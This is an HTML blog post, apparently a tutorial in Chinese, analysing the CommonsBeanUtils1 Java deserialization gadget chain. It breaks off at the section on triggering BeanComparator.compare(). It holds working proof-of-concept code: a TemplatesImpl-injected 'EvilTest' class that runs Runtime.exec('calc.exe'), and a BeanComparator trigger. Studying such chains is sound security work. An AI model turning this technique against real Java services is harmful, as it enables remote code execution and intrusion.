@@ -1,0 +1,411 @@
+<!DOCTYPE html>
+<html lang="en-us">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>java安全 CB1利用链分析 - ThnPinkman’s blog</title><meta name="Description" content="只是向上走"><meta property="og:url" content="https://thnpkm.github.io/posts/java%E5%AE%89%E5%85%A8/java%E5%AE%89%E5%85%A8-cb1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/">
+  <meta property="og:site_name" content="ThnPinkman’s blog">
+  <meta property="og:title" content="java安全 CB1利用链分析">
+  <meta property="og:description" content="前言 在之前我们学习了java.util.PriorityQueue，它是java中的一个优先队列，队列的每个元素都有优先级，在反序列化这个对象的时候，为了保证队列顺序，会将队列中的元素进行排序，从而调用了java.io.Comparator接口的compare()方法，进而执行恶意反序列化操作
+我们能不能找到除了之前提到的TransformingComparator类以外的其他可以利用的java.util.Comparator对象？我们需要了解一下Commons Beanuitls
+Apache Commons Beanutils Apache Commons Beanutils 是 Apache Commons 工具集下的另一个项目，它提供了对普通Java类对象（也称为JavaBean）的一些操作方法。
+javaBean就是一种标准化的java对象，成员变量为private，提供了对成员变量的getter()和setter()方法，符合驼峰命名法
+final public class Cat { private String name = &#34;catalina&#34;; public String getName() { return name; } public void setName(String name) { this.name = name; } } 在Commons Beanutils中提供了一个静态方法PropertyUtils.getProperty()
+public static Object getProperty(Object bean, String name) throws IllegalAccessException, InvocationTargetException, NoSuchMethodException { return PropertyUtilsBean.getInstance().getProperty(bean, name); } 让使用者可以直接调用任意JavaBean的getter方法，比如：
+PropertyUtils.getProperty(new Cat(),&#39;name&#39;) 这个方法会调用Cat对象的getName()方法，使用该方法可以调用任意对象的getter方法
+CommonsBeanUtils1 BeanComparator 我们的目的是找到其他的实现java.util.Comparator的类
+在commons-beanutils中有一个BeanComparator类：
+构造方法：
+public BeanComparator() { this((String)null); } public BeanComparator(String property) { this(property, ComparableComparator.">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-08-20T22:54:45+08:00">
+    <meta property="article:modified_time" content="2024-08-20T22:54:45+08:00">
+    <meta property="article:tag" content="Java">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="java安全 CB1利用链分析">
+  <meta name="twitter:description" content="前言 在之前我们学习了java.util.PriorityQueue，它是java中的一个优先队列，队列的每个元素都有优先级，在反序列化这个对象的时候，为了保证队列顺序，会将队列中的元素进行排序，从而调用了java.io.Comparator接口的compare()方法，进而执行恶意反序列化操作
+我们能不能找到除了之前提到的TransformingComparator类以外的其他可以利用的java.util.Comparator对象？我们需要了解一下Commons Beanuitls
+Apache Commons Beanutils Apache Commons Beanutils 是 Apache Commons 工具集下的另一个项目，它提供了对普通Java类对象（也称为JavaBean）的一些操作方法。
+javaBean就是一种标准化的java对象，成员变量为private，提供了对成员变量的getter()和setter()方法，符合驼峰命名法
+final public class Cat { private String name = &#34;catalina&#34;; public String getName() { return name; } public void setName(String name) { this.name = name; } } 在Commons Beanutils中提供了一个静态方法PropertyUtils.getProperty()
+public static Object getProperty(Object bean, String name) throws IllegalAccessException, InvocationTargetException, NoSuchMethodException { return PropertyUtilsBean.getInstance().getProperty(bean, name); } 让使用者可以直接调用任意JavaBean的getter方法，比如：
+PropertyUtils.getProperty(new Cat(),&#39;name&#39;) 这个方法会调用Cat对象的getName()方法，使用该方法可以调用任意对象的getter方法
+CommonsBeanUtils1 BeanComparator 我们的目的是找到其他的实现java.util.Comparator的类
+在commons-beanutils中有一个BeanComparator类：
+构造方法：
+public BeanComparator() { this((String)null); } public BeanComparator(String property) { this(property, ComparableComparator.">
+<meta name="application-name" content="ThnPinkman&#39;s blog">
+<meta name="apple-mobile-web-app-title" content="ThnPinkman&#39;s blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://thnpkm.github.io/posts/java%E5%AE%89%E5%85%A8/java%E5%AE%89%E5%85%A8-cb1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/" /><link rel="prev" href="https://thnpkm.github.io/posts/java%E5%AE%89%E5%85%A8/java%E5%AE%89%E5%85%A8-cc2%E9%93%BE/" /><link rel="next" href="https://thnpkm.github.io/posts/java%E5%AE%89%E5%85%A8/java%E5%AE%89%E5%85%A8-rmi/" /><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/normalize.css@8.0.1/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "java安全 CB1利用链分析",
+        "inLanguage": "en-us",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/thnpkm.github.io\/posts\/java%E5%AE%89%E5%85%A8\/java%E5%AE%89%E5%85%A8-cb1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90\/"
+        },"genre": "posts","keywords": "java","wordcount":  568 ,
+        "url": "https:\/\/thnpkm.github.io\/posts\/java%E5%AE%89%E5%85%A8\/java%E5%AE%89%E5%85%A8-cb1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90\/","datePublished": "2024-08-20T22:54:45+08:00","dateModified": "2024-08-20T22:54:45+08:00","publisher": {
+            "@type": "Organization",
+            "name": "","logo": "https:\/\/thnpkm.github.io\/1651835469576.jpg"},"author": {
+                "@type": "Person",
+                "name": "Author"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="ThnPinkman’s blog"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.github.io/1651835469576.jpg"
+        data-srcset="https://thnpkm.github.io/1651835469576.jpg, https://thnpkm.github.io/1651835469576.jpg 1.5x, https://thnpkm.github.io/1651835469576.jpg 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.github.io/1651835469576.jpg"
+        title="https://thnpkm.github.io/1651835469576.jpg" />ThnPinkman&#39;s blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/about/"> About </a><a class="menu-item" href="/categories/"> Categories </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="ThnPinkman’s blog"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.github.io/1651835469576.jpg"
+        data-srcset="https://thnpkm.github.io/1651835469576.jpg, https://thnpkm.github.io/1651835469576.jpg 1.5x, https://thnpkm.github.io/1651835469576.jpg 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.github.io/1651835469576.jpg"
+        title="https://thnpkm.github.io/1651835469576.jpg" />ThnPinkman&#39;s blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/about/" title="">About</a><a class="menu-item" href="/categories/" title="">Categories</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">java安全 CB1利用链分析</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Author</a>
+</span>&nbsp;<span class="post-category">included in <a href="/categories/java%E5%AE%89%E5%85%A8/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Java安全</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2024-08-20">2024-08-20</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;568 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;3 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#前言">前言</a></li>
+    <li><a href="#apache-commons-beanutils">Apache Commons Beanutils</a></li>
+    <li><a href="#commonsbeanutils1">CommonsBeanUtils1</a>
+      <ul>
+        <li><a href="#beancomparator">BeanComparator</a></li>
+        <li><a href="#如何调用beancomparatorcompare方法">如何调用BeanComparator#compare()方法？</a></li>
+        <li><a href="#构造poc">构造poc</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h2 id="前言">前言</h2>
+<p>在之前我们学习了<code>java.util.PriorityQueue</code>，它是java中的一个优先队列，队列的每个元素都有优先级，在反序列化这个对象的时候，为了保证队列顺序，会将队列中的元素进行排序，从而调用了<code>java.io.Comparator</code>接口的<code>compare()</code>方法，进而执行恶意反序列化操作</p>
+<p>我们能不能找到除了之前提到的<code>TransformingComparator</code>类以外的其他可以利用的<code>java.util.Comparator</code>对象？我们需要了解一下<code>Commons Beanuitls</code></p>
+<h2 id="apache-commons-beanutils">Apache Commons Beanutils</h2>
+<p>Apache Commons Beanutils 是 Apache Commons 工具集下的另一个项目，它提供了对普通Java类对象（也称为JavaBean）的一些操作方法。</p>
+<blockquote>
+<p>javaBean就是一种标准化的java对象，成员变量为<code>private</code>，提供了对成员变量的<code>getter()</code>和<code>setter()</code>方法，符合驼峰命名法</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">final</span> <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Cat</span> { 
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> String name <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;catalina&#34;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> String <span style="color:#a6e22e">getName</span>() { <span style="color:#66d9ef">return</span> name;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">setName</span>(String name) { <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">name</span> <span style="color:#f92672">=</span> name;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div></blockquote>
+<p>在<code>Commons Beanutils</code>中提供了一个静态方法<code>PropertyUtils.getProperty()</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> Object <span style="color:#a6e22e">getProperty</span>(Object bean, String name) <span style="color:#66d9ef">throws</span> IllegalAccessException, InvocationTargetException, NoSuchMethodException {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> PropertyUtilsBean.<span style="color:#a6e22e">getInstance</span>().<span style="color:#a6e22e">getProperty</span>(bean, name);
+</span></span><span style="display:flex;"><span>    }
+</span></span></code></pre></div><p>让使用者可以直接调用任意JavaBean的getter方法，比如：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>PropertyUtils.<span style="color:#a6e22e">getProperty</span>(<span style="color:#66d9ef">new</span> Cat(),<span style="color:#960050;background-color:#1e0010">&#39;</span>name<span style="color:#960050;background-color:#1e0010">&#39;</span>)
+</span></span></code></pre></div><p>这个方法会调用<code>Cat</code>对象的<code>getName()</code>方法，使用该方法可以调用任意对象的<code>getter</code>方法</p>
+<h2 id="commonsbeanutils1">CommonsBeanUtils1</h2>
+<h3 id="beancomparator">BeanComparator</h3>
+<p>我们的目的是找到其他的实现<code>java.util.Comparator</code>的类</p>
+<p>在<code>commons-beanutils</code>中有一个<code>BeanComparator</code>类：</p>
+<p>构造方法：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#a6e22e">BeanComparator</span>() {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">this</span>((String)<span style="color:#66d9ef">null</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#a6e22e">BeanComparator</span>(String property) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">this</span>(property, ComparableComparator.<span style="color:#a6e22e">getInstance</span>());
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#a6e22e">BeanComparator</span>(String property, Comparator<span style="color:#f92672">&lt;?&gt;</span> comparator) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">setProperty</span>(property);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (comparator <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">comparator</span> <span style="color:#f92672">=</span> comparator;
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">comparator</span> <span style="color:#f92672">=</span> ComparableComparator.<span style="color:#a6e22e">getInstance</span>();
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>构造方法可以为：<code>property</code>属性赋值，这个很重要后面会用到</p>
+<p>看<code>compare()</code>方法</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">compare</span>(T o1, T o2) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">property</span> <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">internalCompare</span>(o1, o2);
+</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>                Object value1 <span style="color:#f92672">=</span> PropertyUtils.<span style="color:#a6e22e">getProperty</span>(o1, <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">property</span>);
+</span></span><span style="display:flex;"><span>                Object value2 <span style="color:#f92672">=</span> PropertyUtils.<span style="color:#a6e22e">getProperty</span>(o2, <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">property</span>);
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">internalCompare</span>(value1, value2);
+</span></span><span style="display:flex;"><span>            } <span style="color:#66d9ef">catch</span> (IllegalAccessException var5) {
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> RuntimeException(<span style="color:#e6db74">&#34;IllegalAccessException: &#34;</span> <span style="color:#f92672">+</span> var5.<span style="color:#a6e22e">toString</span>());
+</span></span><span style="display:flex;"><span>            } <span style="color:#66d9ef">catch</span> (InvocationTargetException var6) {
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> RuntimeException(<span style="color:#e6db74">&#34;InvocationTargetException: &#34;</span> <span style="color:#f92672">+</span> var6.<span style="color:#a6e22e">toString</span>());
+</span></span><span style="display:flex;"><span>            } <span style="color:#66d9ef">catch</span> (NoSuchMethodException var7) {
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> RuntimeException(<span style="color:#e6db74">&#34;NoSuchMethodException: &#34;</span> <span style="color:#f92672">+</span> var7.<span style="color:#a6e22e">toString</span>());
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">internalCompare</span>(Object val1, Object val2) {
+</span></span><span style="display:flex;"><span>        Comparator c <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">comparator</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> c.<span style="color:#a6e22e">compare</span>(val1, val2);
+</span></span><span style="display:flex;"><span>    }
+</span></span></code></pre></div><p>如果 <code>this.property</code> 不为空，则用 <code>PropertyUtils.getProperty </code>分别取这两个对象的<code>this.property</code>属性，比较属性的值。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>Object value1 <span style="color:#f92672">=</span> PropertyUtils.<span style="color:#a6e22e">getProperty</span>(o1, <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">property</span>);
+</span></span><span style="display:flex;"><span>Object value2 <span style="color:#f92672">=</span> PropertyUtils.<span style="color:#a6e22e">getProperty</span>(o2, <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">property</span>);
+</span></span></code></pre></div><p>它会去调用<code>o1、o2</code>对象的名为property的属性值的<code>getter</code>方法这里很重要，加入<code>o1</code>是<code>TemplatesImpl</code>对象的话这里是可以构造反序列化利用链的.</p>
+<p>我们的目的是调用到<code>PropertyUtils.getProperty</code>,这个方法会自动去调用一个JavaBean的<code>getter</code>方法,这个点是任意代码执行的关键。有没有什么getter方法可以执行恶意代码呢？</p>
+<p>我们先来回顾一下前面<code>TemplatesImpl</code>中的调用链：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>TemplatesImpl<span style="color:#960050;background-color:#1e0010">#</span>getOutputProperties() <span style="color:#f92672">-&gt;</span> TemplatesImpl<span style="color:#960050;background-color:#1e0010">#</span>newTransformer() <span style="color:#f92672">-&gt;</span>
+</span></span><span style="display:flex;"><span>TemplatesImpl<span style="color:#960050;background-color:#1e0010">#</span>getTransletInstance() <span style="color:#f92672">-&gt;</span> TemplatesImpl<span style="color:#960050;background-color:#1e0010">#</span>defineTransletClasses()
+</span></span><span style="display:flex;"><span><span style="color:#f92672">-&gt;</span> TransletClassLoader<span style="color:#960050;background-color:#1e0010">#</span>defineClass()
+</span></span></code></pre></div><p>这里的<code>getOutputProperties()</code>就是<code>getter</code>方法的形式，并且它会调用<code>newTransformer()</code>触发恶意字节码执行。因此，如果我们<code>PropertyUtils.getProperty(o1, this.property)</code>第一个形参传入：<code>TemplatesImpl</code>对象，并且第二个参数<code>property</code>传入值<code>outputProperties</code></p>
+<p>那么就会调用<code>TemplatesImpl#getOutputProperties()</code>方法了</p>
+<p>我们可以简单测试一下：</p>
+<p>依然是EvilTest 来构造<code>AbstractTranslet</code>字节码</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.IOException;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">EvilTest</span> <span style="color:#66d9ef">extends</span> AbstractTranslet {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">@Override</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">transform</span>(DOM document, SerializationHandler<span style="color:#f92672">[]</span> handlers) <span style="color:#66d9ef">throws</span> TransletException {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">@Override</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">transform</span>(DOM document, DTMAxisIterator iterator, SerializationHandler handler) <span style="color:#66d9ef">throws</span> TransletException {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">EvilTest</span>() <span style="color:#66d9ef">throws</span> IOException {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">super</span>();
+</span></span><span style="display:flex;"><span>        Runtime.<span style="color:#a6e22e">getRuntime</span>().<span style="color:#a6e22e">exec</span>(<span style="color:#e6db74">&#34;calc.exe&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.beanutils.BeanComparator;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> javassist.ClassPool;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> javassist.CtClass;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.lang.reflect.Field;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">cb1</span> {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">setFieldValue</span>(Object obj, String fieldName, Object value) <span style="color:#66d9ef">throws</span> Exception {
+</span></span><span style="display:flex;"><span>        Field field <span style="color:#f92672">=</span> obj.<span style="color:#a6e22e">getClass</span>().<span style="color:#a6e22e">getDeclaredField</span>(fieldName);
+</span></span><span style="display:flex;"><span>        field.<span style="color:#a6e22e">setAccessible</span>(<span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>        field.<span style="color:#a6e22e">set</span>(obj, value);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(String<span style="color:#f92672">[]</span> args) <span style="color:#66d9ef">throws</span> Exception {
+</span></span><span style="display:flex;"><span>        ClassPool pool <span style="color:#f92672">=</span> ClassPool.<span style="color:#a6e22e">getDefault</span>();
+</span></span><span style="display:flex;"><span>        CtClass clazzz <span style="color:#f92672">=</span> pool.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#34;EvilTest&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> code <span style="color:#f92672">=</span> clazzz.<span style="color:#a6e22e">toBytecode</span>();
+</span></span><span style="display:flex;"><span>        TemplatesImpl obj <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> TemplatesImpl();
+</span></span><span style="display:flex;"><span>        setFieldValue(obj, <span style="color:#e6db74">&#34;_bytecodes&#34;</span>, <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">byte</span><span style="color:#f92672">[][]</span>{code});
+</span></span><span style="display:flex;"><span>        setFieldValue(obj, <span style="color:#e6db74">&#34;_name&#34;</span>, <span style="color:#e6db74">&#34;HelloTemplatesImpl&#34;</span>);
+</span></span><span style="display:flex;"><span>        setFieldValue(obj, <span style="color:#e6db74">&#34;_tfactory&#34;</span>, <span style="color:#66d9ef">new</span> TransformerFactoryImpl());
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        BeanComparator beanComparator <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> BeanComparator(<span style="color:#e6db74">&#34;outputProperties&#34;</span>);
+</span></span><span style="display:flex;"><span>        beanComparator.<span style="color:#a6e22e">compare</span>(obj,<span style="color:#66d9ef">null</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>确实弹出了计算器，说明这是对的</p>
+<h3 id="如何调用beancomparatorcompare方法">如何调用BeanComparator#compare()方法？</h3>
